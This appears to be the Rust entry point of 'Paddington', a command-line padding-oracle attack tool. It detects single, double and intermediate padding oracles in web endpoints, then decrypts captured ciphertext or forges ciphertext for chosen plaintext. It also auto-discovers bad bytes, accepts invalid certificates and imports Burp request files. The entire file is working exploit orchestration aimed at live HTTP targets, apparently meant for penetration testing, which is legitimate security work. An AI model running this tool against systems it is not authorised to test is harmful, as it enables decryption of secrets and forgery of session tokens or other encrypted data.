use std::io::{self, Write};

use clap::{Parser, ValueEnum};
use colored::Colorize;
use regex::Regex;
use strum_macros::Display;
use tokio::sync::mpsc;

use crate::{
    crypt::{
        cradlehelpers::discover_bad_bytes,
        detector::{IntermediateDetector, SimpleDetector, find_baseline_response},
    },
    helper::{
        Config, Encoding, Messages, ParsedRequest, decode_ct, detect_encoding, encode_ct,
        parse_request_file, strip_pkcs7, unescape,
    },
    oracle::{DoubleOracle, IntermediateOracle, Oracle, SingleOracle},
    print::{fmt_bytes_custom, progress_bar},
    transport::HTTPTransport,
};
use reqwest::Method;

pub mod crypt;
pub mod errors;
pub mod helper;
pub mod oracle;
pub mod print;
pub mod transport;

#[derive(Display, Debug, Clone, ValueEnum)]
enum Block {
    SMALL,
    MED,
    LARGE,
    AUTO,
}

#[derive(Display, Debug, Clone, ValueEnum, PartialEq)]
enum Attack {
    DOUBLE,
    SINGLE,
    INTER,
    /// quick checks only (single + double)
    QUICK,
    /// all attacks including the time-consuming intermediate attack
    ALL,
}

/// Run the forge-or-decrypt step of an attack against an oracle and print the
/// result. The oracle is built by `make_oracle` so it can be wired to the
/// progress-bar channel that this function owns. Returns `true` if the attack
/// succeeded (and the program should therefore exit), or `false` if it failed
/// so the next attack can be tried.
async fn run_oracle_attack<O, F>(
    make_oracle: F,
    standard_ct: &[u8],
    ciphertext: &[u8],
    forge: Option<String>,
    encoding: Vec<Encoding>,
    ct_len: usize,
    block_size: usize,
    hex_output: bool,
    with_padding: bool,
) -> bool
where
    O: Oracle,
    F: FnOnce(tokio::sync::mpsc::Sender<Messages>) -> O,
{
    let (tx, rx) = mpsc::channel(255);
    let close_progress = progress_bar(ct_len, block_size, rx);
    let oracle = make_oracle(tx);
    if let Some(pt) = forge {
        let pt = unescape(pt);
        if let Ok(ct) = oracle.forge(standard_ct, &pt).await {
            close_progress();
            // the first block of a forged ciphertext is the IV. Print it
            // separately (for when the user controls the IV), then the full
            // ciphertext (for when the IV is baked in and not user-controlled).
            if ct.len() >= block_size {
                let (iv, rest) = ct.split_at(block_size);
                let iv_str = encode_ct(iv, encoding.clone()).unwrap_or(String::new());
                let ct_str = encode_ct(rest, encoding.clone()).unwrap_or(String::new());
                let full_str = encode_ct(&ct, encoding).unwrap_or(String::new());
                println!("{}\n{}", "IV".yellow(), iv_str.green());
                println!();
                println!("{}\n{}", "ciphertext".yellow(), ct_str.green());
                println!();
                println!("{}\n{}", "ciphertext (IV + blocks)".yellow(), full_str.green());
            } else {
                println!(
                    "{}\n{}",
                    "ciphertext".yellow(),
                    encode_ct(&ct, encoding)
                        .unwrap_or(String::new())
                        .green()
                );
            }
            return true;
        }
    } else if let Ok(pt) = oracle.decrypt(ciphertext).await {
        close_progress();
        let pt = if with_padding {
            pt
        } else {
            strip_pkcs7(&pt, block_size)
        };
        println!("{}\n{}", "plaintext".yellow(), fmt_bytes_custom(&pt, hex_output).green());
        return true;
    }
    close_progress();
    false
}

/// Determine whether an endpoint is reachable over `https://` or `http://`.
///
/// Tries HTTPS first; if that fails (TLS handshake error, connection refused,
/// etc.) it falls back to HTTP. Returns the scheme prefix (`"https"` or
/// `"http"`) that successfully connected, or `None` if neither worked.
///
/// We accept invalid TLS certs (like the transport does) since many targets in
/// pentest scenarios use self-signed certs, and we only care whether the TLS
/// handshake completes, not whether the cert is valid.
async fn probe_scheme(host: &str, proxy: Option<&str>) -> Option<String> {
    let build_client = || -> reqwest::Client {
        let mut builder = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none())
            .timeout(std::time::Duration::from_secs(5));
        if let Some(p) = proxy {
            if let Ok(proxy) = reqwest::Proxy::all(p) {
                builder = builder.proxy(proxy);
            }
        }
        builder.build().unwrap_or_else(|_| reqwest::Client::new())
    };

    // try https first
    for (scheme, consider_tls_err) in [("https", true), ("http", false)] {
        let url = format!("{scheme}://{host}/");
        let client = build_client();
        match client.get(&url).send().await {
            Ok(_) => return Some(scheme.to_string()),
            Err(e) => {
                // for https, a TLS error means https isn't supported -> fall
                // through to http. for http, any error means give up.
                let is_tls_handshake = e.is_connect()
                    || e.to_string().to_lowercase().contains("tls")
                    || e.to_string().to_lowercase().contains("ssl")
                    || e.to_string().to_lowercase().contains("certificate");
                if consider_tls_err && is_tls_handshake {
                    continue;
                }
                // also fall through if https gave a connection error
                if consider_tls_err && e.is_connect() {
                    continue;
                }
            }
        }
    }
    None
}

#[derive(Parser, Debug, Clone)]
#[command(name = "Paddington", version, about = "Padding Oracles Ain't Dead!")]
struct Args {
    ///url for the vulnerable endpoint. Optional when --request-file is provided
    /// (the origin is then derived from the request's Host header). When both
    /// are given, this is the origin that the path in the request file is
    /// relative to.
    #[arg(short, long)]
    url: Option<String>,

    ///path to a raw HTTP request file (as exported from Burp Suite). When
    /// provided, the url, method, headers, and body are read from this file,
    /// and you only need to specify the injection point with -p
    #[arg(long)]
    request_file: Option<String>,

    ///params to scan, can be url parameters, body parameters, or headers. Alternatively, wrap the value you want to analyze with "@{ }@" inline in the url/headers/body instead of using -p
    #[arg(short, long)]
    params: Vec<String>,

    ///add headers to the request
    #[arg(short = 'H', long)]
    headers: Vec<String>,

    ///add the request body
    #[arg(short = 'B', long = "body", alias = "data")]
    body: Option<String>,

    ///the request method to use [default: GET]
    #[arg(short, long, ignore_case = true)]
    method: Option<Method>,

    ///how to decode the target token. Specify each layer in the order it
    ///should be removed. For example, if the token is base64 encoded then URL
    /// encoded (e.g. `eyJ%3d%3d`), use `-d url -d b64` to URL decode, then base64
    /// decode. When omitted, the encoding is auto-detected from the token.
    #[arg(
        short,
        long = "decode",
        alias = "encoding",
        help = "how to decode the target token, specify each encoding layer in the order it should be removed. example: if a string is base64 encoded then URL encoded, use \"-d url -d b64\" to url decode, and then \nbase64 decode. if no encodings are specified, the encoding is automatically detected from the token [default: auto]"
    )]
    decode: Vec<Encoding>,

    ///the number of threads to use
    #[arg(short, long, default_value_t = 10)]
    threads: usize,

    ///the plaintext to forge
    #[arg(short, long)]
    forge: Option<String>,

    ///the block size to use (small = 8) (med = 16) (large = 32)
    #[arg(short, long, ignore_case = true, default_value_t = Block::AUTO)]
    block_size: Block,

    ///the search string to match a response with valid padding
    #[arg(short, long)]
    search_pat: Option<String>,

    ///the proxy to use
    #[arg(long)]
    proxy: Option<String>,

    ///override the ciphertext to use
    #[arg(short, long)]
    ciphertext: Option<String>,

    ///add a prefix to the ciphertext (IV) encoded the same way as the ciphertext
    #[arg(short, long)]
    iv: Option<String>,

    #[arg(short, long, ignore_case = true, default_value_t = Attack::QUICK, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack) (quick = single + double, default) (all = single + double + intermediate)")]
    attack: Attack,

    ///number of times to retry when no valid byte found
    #[arg(short, long, default_value_t = 5)]
    retry: usize,

    ///known bad characters used for intermediate oracle. You don't need to list all invalid bytes for the attack to work, only a few are needed.
    ///The default configuration is best for JSON on Node, PHP, etc. The intermediate oracle doesn't work great for most Python apps at the moment.
    ///add bad bytes like so '\x00\x01\x02"\xff}{[]!'
    #[arg(long)]
    bad_chars: Option<String>,

    ///the block index to perform the intermediate padding oracle attack at
    #[arg(long)]
    intermediate_block_index: Option<usize>,

    ///perform the intermediate oracle attack in place without adding any additional blocks. Note the injection point must be at least 3 blocks from the end
    /// to give enough room to build the cradle and perform the attack
    #[arg(long, default_value_t = false)]
    inplace: bool,

    ///detect bad bytes assuming the text is using null byte padding instead of the standard PKCS#7
    #[arg(long, default_value_t = false)]
    null_padding: bool,

    /// when forging on an intermediate oracle, find a valid prefix. Otherwise if you attempt to place the forged ciphertext back in the original ciphertext it will
    /// likely cause a bad character error.
    #[arg(long, default_value_t = false)]
    forge_calc_prefix: bool,

    /// when decrypting, output the final decrypted string as hex-encoded bytes
    #[arg(long, default_value_t = false)]
    hex_output: bool,

    /// when decrypting, keep the PKCS#7 padding bytes in the output. By default
    /// the padding is stripped.
    #[arg(long, default_value_t = false)]
    with_padding: bool,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    if args.url.is_none() && args.request_file.is_none() {
        println!(
            "Error: either --url or --request-file must be provided. Run with --help for usage."
        );
        return;
    }
    // when no encodings are specified, leave it empty so the transport can
    // auto-detect the encoding from the captured ciphertext
    let mut encoding = args.decode.clone();

    let mut config = Config::new();
    let block_sizes: &[u8] = match args.block_size {
        Block::SMALL => &[8],
        Block::MED => &[16],
        Block::LARGE => &[32],
        Block::AUTO => &[16, 8, 32],
    };
    for block_size in block_sizes {
        let args = args.clone();
        config.set("blk_size".to_string(), (*block_size).to_string());
        config.set("threads".to_string(), args.threads.to_string());
        config.set("retry".to_string(), args.retry.to_string());
        // handle search pattern regular expression
        let search_pat;
        if let Some(pat) = args.search_pat {
            if let Ok(reg) = Regex::new(&pat) {
                search_pat = Some(reg);
            } else {
                println!("Error, invalid search pattern {}", pat);
                return;
            }
        } else {
            search_pat = None;
        }
        let mut headers: Vec<(String, String)> = vec![];
        for header in &args.headers {
            let header_parts = header.split(':').map(String::from).collect::<Vec<String>>();
            if header_parts.len() >= 2 {
                // get the val and remove leading whitespace
                let header_val = header_parts[1..].join("").trim_ascii_start().to_string();
                headers.push((header_parts[0].clone(), header_val));
            }
        }

        // If a request file was provided, parse it and use its method, url,
        // headers, and body. Extra -H headers passed on the command line are
        // still merged in on top.
        let mut url = args.url.clone().unwrap_or_default();
        let mut method = args.method.clone().unwrap_or(Method::GET);
        let mut data = args.body.clone();
        if let Some(ref req_file) = args.request_file {
            let content = match std::fs::read_to_string(req_file) {
                Ok(content) => content,
                Err(e) => {
                    println!("Error, could not read request file {}: {}", req_file, e);
                    return;
                }
            };
            let parsed: ParsedRequest = match parse_request_file(
                content,
                args.url.as_deref(),
                Some(&headers),
            ) {
                Ok(parsed) => parsed,
                Err(e) => {
                    println!("Error parsing request file {}: {}", req_file, e);
                    return;
                }
            };
            url = parsed.url;
            method = parsed.method.parse().unwrap_or_else(|_| Method::GET);
            data = parsed.body.clone();
            // merge parsed headers with any additional command line headers
            for header in &parsed.headers {
                if !headers.iter().any(|h| h.0.eq_ignore_ascii_case(&header.0)) {
                    headers.push(header.clone());
                }
            }
            // when the scheme was inferred (no --url and a non-absolute request
            // line), probe the endpoint to confirm whether http or https is in
            // use rather than assuming https.
            if parsed.scheme_inferred {
                // url is currently "<scheme>://<host><path>", split off the scheme
                if let Some(rest) = url.split("://").nth(1) {
                    let host = rest.split('/').next().unwrap_or("");
                    let path_after_host = &rest[host.len()..];
                    if !host.is_empty() {
                        println!(
                            "{}",
                            "Probing endpoint to determine http vs https..."
                                .yellow()
                        );
                        match probe_scheme(host, args.proxy.as_deref()).await {
                            Some(scheme) if scheme == "http" => {
                                println!(
                                    "{}",
                                    "Endpoint is reachable over http, using http://"
                                        .yellow()
                                );
                                url = format!("http://{host}{path_after_host}");
                            }
                            Some(_) => {
                                println!(
                                    "{}",
                                    "Endpoint is reachable over https".green()
                                );
                            }
                            None => {
                                println!(
                                    "{}",
                                    "Could not reach endpoint over http or https, defaulting to https"
                                        .red()
                                );
                            }
                        }
                    }
                }
            }
        }

        let standard_transport = Box::new(HTTPTransport::new(
            url.clone(),
            headers.clone(),
            method,
            data.clone(),
            encoding.clone(),
            args.params.clone(),
            args.proxy.clone(),
        ));
        // sync the (possibly auto-detected) encoding back from the transport so
        // encode_ct calls later use the right encoding
        encoding = standard_transport.encoding.clone();
        let standard_ct = standard_transport.base_ct.clone();
        let ciphertext;
        if let Some(ref ct) = args.ciphertext {
            let enc = if args.decode.is_empty() {
                detect_encoding(ct)
            } else {
                args.decode.clone()
            };
            ciphertext = decode_ct(ct.clone(), enc);
        } else {
            ciphertext = standard_ct.clone();
        }
        //add iv onto the ciphertext if specified
        let ciphertext = match args.iv {
            Some(ref str) => {
                let enc = if args.decode.is_empty() {
                    detect_encoding(str)
                } else {
                    args.decode.clone()
                };
                [decode_ct(str.clone(), enc), ciphertext].concat()
            }
            None => ciphertext,
        };

        let baseline = find_baseline_response(
            &standard_ct,
            standard_transport.clone(),
            search_pat.clone(),
            args.threads,
        )
        .await
        .ok();

        // find ct_len for the progress bar
        let ct_len = if let Some(ref pt) = args.forge {
            let pt = unescape(pt.to_owned());
            ((pt.len() / *block_size as usize) + 1) * *block_size as usize
        } else {
            // the ciphertext (and any iv) was already decoded above, so just use
            // its length to size the progress bar
            ciphertext.len() - *block_size as usize
        };

        if matches!(args.attack, Attack::ALL | Attack::QUICK | Attack::SINGLE) {
            let detect = SimpleDetector::init(
                None,
                &standard_ct,
                standard_transport.clone(),
                *block_size as usize,
                args.threads,
                baseline.clone(),
                search_pat.clone(),
            )
            .await;
            if let Ok(detector) = detect {
                println!(
                    "{} (block size {})",
                    "Standard Oracle Detected".green(),
                    block_size
                );
                if run_oracle_attack(
                    |tx| SingleOracle::new(detector, tx, *block_size as usize, args.retry),
                    &standard_ct,
                    &ciphertext,
                    args.forge.clone(),
                    encoding.clone(),
                    ct_len,
                    *block_size as usize,
                    args.hex_output,
                    args.with_padding,
                )
                .await
                {
                    return;
                }
            } else {
                println!("No Standard Oracle Detected (block size {})", block_size);
            }
        }

        if matches!(args.attack, Attack::ALL | Attack::QUICK | Attack::DOUBLE) {
            let detect = SimpleDetector::init(
                Some(standard_ct.clone()),
                &standard_ct,
                standard_transport.clone(),
                *block_size as usize,
                args.threads,
                baseline.clone(),
                search_pat.clone(),
            )
            .await;
            if let Ok(detector) = detect {
                println!(
                    "{} (block size {})",
                    "Double Oracle Detected".green(),
                    block_size
                );
                if run_oracle_attack(
                    |tx| DoubleOracle::new(detector, tx, &standard_ct, *block_size as usize, args.retry),
                    &standard_ct,
                    &ciphertext,
                    args.forge.clone(),
                    encoding.clone(),
                    ct_len,
                    *block_size as usize,
                    args.hex_output,
                    args.with_padding,
                )
                .await
                {
                    return;
                }
            } else {
                println!("No Double Oracle Detected (block size {})", block_size);
            }
        }

        if args.attack == Attack::ALL || args.attack == Attack::INTER {
            let detect = IntermediateDetector::init(
                &standard_ct,
                standard_transport,
                *block_size as usize,
                args.threads,
                baseline.clone(),
                search_pat.clone(),
                args.intermediate_block_index.clone().map(|idx| idx - 1),
                args.inplace,
            )
            .await;
            if let Ok(detector) = detect {
                println!(
                    "{} {} (block size {})",
                    "Intermediate Oracle Detected at Block Index".green(),
                    detector.block_prefix.len() / (*block_size) as usize,
                    block_size
                );
                //if attack style is in place, make sure there's enough room after the injection point
                if detector.block_suffix.len() < 3 * (*block_size as usize) && args.inplace {
                    println!("{}", "Not enough space to perform in place attack".red());
                    return;
                }
                let bad_chars = unescape(args.bad_chars.unwrap_or(String::from("")));
                //no bad chars provided, detect them
                if bad_chars.is_empty() {
                    print!("\r\x1B[2K");
                    io::stdout().flush().unwrap();
                    println!(
                        "{}",
                        "No bad chars provided, paddington is automatically detecting them..."
                            .yellow()
                    );
                    let (tx, _rx) = mpsc::channel(255);
                    let second_last_block = standard_ct[standard_ct.len()
                        - (2 * block_size) as usize
                        ..standard_ct.len() - *block_size as usize]
                        .to_vec();
                    let last_block =
                        standard_ct[standard_ct.len() - *block_size as usize..].to_vec();
                    let bad_bytes_res = discover_bad_bytes(
                        &detector,
                        &detector.block_prefix,
                        &detector.block_suffix,
                        &second_last_block,
                        &last_block,
                        20,
                        tx.clone(),
                        args.inplace,
                        args.null_padding,
                    )
                    .await;

                    if let Ok(bad_bytes) = bad_bytes_res {
                        // the backslash character is excluded from the results
                        // since it's commonly a false positive
                        let bad_bytes: Vec<u8> =
                            bad_bytes.into_iter().filter(|b| *b != b'\\').collect();
                        print!("\r\x1B[2K");
                        io::stdout().flush().unwrap();
                        println!(
                            "{} {} '{}'",
                            "Automatically discovered bad bytes!".green(),
                            "Re-run the paddington with the flag --bad-chars",
                            fmt_bytes_custom(&bad_bytes, false)
                        );
                    } else {
                        print!("\r\x1B[2K");
                        io::stdout().flush().unwrap();
                        println!(
                            "Could not auto discover bad bytes: {:?}",
                            bad_bytes_res.err()
                        );
                    }
                    return;
                }

                if run_oracle_attack(
                    |tx| {
                        IntermediateOracle::new(
                            detector,
                            tx,
                            *block_size as usize,
                            &bad_chars,
                            args.inplace,
                            args.null_padding,
                            args.forge_calc_prefix,
                        )
                    },
                    &standard_ct,
                    &ciphertext,
                    args.forge.clone(),
                    encoding.clone(),
                    ct_len,
                    *block_size as usize,
                    args.hex_output,
                    args.with_padding,
                )
                .await
                {
                    return;
                }
            } else {
                println!("No Intermediate Oracle Detected (block size {})", block_size);
            }
        }
    }
}
